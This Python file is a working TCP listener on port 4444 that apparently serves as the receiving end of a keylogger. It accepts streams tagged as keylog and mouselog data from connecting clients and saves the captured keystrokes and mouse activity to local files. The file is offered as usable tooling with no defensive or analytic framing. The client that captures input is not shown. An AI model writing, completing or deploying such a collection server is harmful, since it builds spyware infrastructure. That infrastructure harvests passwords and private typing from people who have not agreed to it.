import socket
import threading
from datetime import datetime
import os

HOST = "0.0.0.0"
PORT = 4444
KEYLOG_FILE = "server_keylog.txt"
MOUSELOG_FILE = "server_mouselog.txt"

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def handle_client(conn, addr):
    timestamp = get_timestamp()
    print(f"[{timestamp}] Connected by {addr}")
    received_data = ""
    
    try:
        while True:
            data = conn.recv(1024).decode()
            if not data:
                print(f"[{timestamp}] Client {addr} disconnected (no data received)")
                break
            received_data += data
            print(f"[{timestamp}] Received {len(data)} bytes from {addr}")
            
            if "--- END ---" in received_data:
                print(f"[{timestamp}] End marker received from {addr}")
                parts = received_data.split("--- END ---")[0].split("--- keylog.txt ---")
                if len(parts) > 1:
                    keylog_data = parts[1].split("--- mouselog.txt ---")[0].strip()
                    if keylog_data:
                        with open(KEYLOG_FILE, "a") as f:
                            f.write(f"[{timestamp}] Received from {addr}:\n{keylog_data}\n")
                        print(f"[{timestamp}] Saved keylog data from {addr}: {len(keylog_data)} bytes")
                    else:
                        print(f"[{timestamp}] No keylog data received from {addr}")
                
                parts = received_data.split("--- mouselog.txt ---")
                if len(parts) > 1:
                    mouselog_data = parts[1].strip()
                    if mouselog_data:
                        with open(MOUSELOG_FILE, "a") as f:
                            f.write(f"[{timestamp}] Received from {addr}:\n{mouselog_data}\n")
                        print(f"[{timestamp}] Saved mouselog data from {addr}: {len(mouselog_data)} bytes")
                    else:
                        print(f"[{timestamp}] No mouselog data received from {addr}")
                
                print(f"[{timestamp}] Full data from {addr}:\n{received_data}")
                received_data = ""
    
    except socket.error as e:
        print(f"[{timestamp}] Socket error with client {addr}: {e}")
    
    except Exception as e:
        print(f"[{timestamp}] Unexpected error with client {addr}: {e}")
    
    finally:
        conn.close()
        print(f"[{timestamp}] Connection closed for {addr}")

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen()
        print(f"[{get_timestamp()}] Server listening on {HOST}:{PORT}...")
        print(f"[{get_timestamp()}] Keep this server running while testing the client. Press Ctrl+C to stop.")
        
        while True:
            conn, addr = server_socket.accept()
            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_thread.start()
    
    except socket.error as e:
        print(f"[{get_timestamp()}] Bind error: {e}. Ensure the port is free and IP is valid.")
        if e.errno == 99:
            print(f"Tip: Try changing PORT to an unused port (e.g., 5555) or use HOST = '0.0.0.0'.")
    
    except KeyboardInterrupt:
        print(f"[{get_timestamp()}] Server stopped by user (KeyboardInterrupt).")
    
    except Exception as e:
        print(f"[{get_timestamp()}] Unexpected error in server: {e}")
    
    finally:
        server_socket.close()

if __name__ == "__main__":
    main()